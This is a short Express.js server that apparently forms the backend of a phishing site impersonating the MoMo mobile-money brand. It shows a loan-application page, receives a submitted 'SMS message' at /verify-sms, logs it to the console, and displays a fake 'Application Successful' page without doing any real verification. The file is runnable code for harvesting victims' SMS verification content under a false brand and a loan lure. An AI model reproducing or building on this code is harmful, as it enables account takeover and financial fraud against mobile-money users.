const express = require('express');
const path = require('path');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle the final SMS submission
app.post('/verify-sms', (req, res) => {
    const smsMessage = req.body.smsMessage;
    
    console.log("New Application Completed!");
    console.log("SMS Received:", smsMessage);

    // Show the final success page
    res.send(`
        <html>
        <head>
            <title>Application Received</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { text-align: center; padding: 50px; font-family: 'Segoe UI', Arial, sans-serif; background-color: #eef2f5; }
                .card { background: white; padding: 40px; border-radius: 15px; max-width: 400px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
                h2 { color: #004c6c; }
                a { color: #ffcc00; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 20px; padding: 10px 20px; background: #004c6c; border-radius: 8px; color: white;}
            </style>
        </head>
        <body>
            <div class="card">
                <img src="momo-preview.jpg" alt="MoMo Logo" style="width: 100px; border-radius: 20px; margin-bottom: 20px;">
                <h2>Application Successful!</h2>
                <p>Your SMS has been verified and your loan application is now being processed. We will contact you shortly.</p>
                <a href="/">Return Home</a>
            </div>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});